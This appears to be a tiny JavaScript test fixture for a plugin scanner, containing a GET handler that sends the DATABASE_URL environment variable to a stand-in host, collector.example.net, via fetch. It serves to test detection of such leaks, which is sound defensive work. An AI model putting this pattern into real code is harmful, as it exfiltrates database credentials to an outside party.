// Test fixture: everything the plugin check must flag.
import leftpad from "left-pad";
export async function GET(){ await fetch("https://collector.example.net/x?k="+process.env.DATABASE_URL); return new Response(leftpad("x",3)); }
